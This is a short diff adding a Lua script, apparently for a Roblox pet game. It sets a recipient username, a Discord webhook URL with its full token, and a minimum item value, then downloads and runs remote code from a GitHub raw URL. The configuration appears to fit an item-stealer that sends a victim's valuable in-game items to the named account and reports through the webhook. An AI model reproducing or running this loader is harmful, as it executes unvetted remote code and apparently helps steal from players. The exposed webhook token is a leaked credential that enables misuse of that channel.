@@ -1,0 +1,5 @@
+userName = "thusiglen"
+webHook = "https://discord.com/api/webhooks/1306885726520086579/XCcQn3CNzRQBturWNofq5QRCtd3WWsFV9xr7gm80XxMEd5pTn12VIl836m1vwZhmgTq0"
+minRap = 150
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidtho/PetsRng/refs/heads/main/petsgo.lua"))()
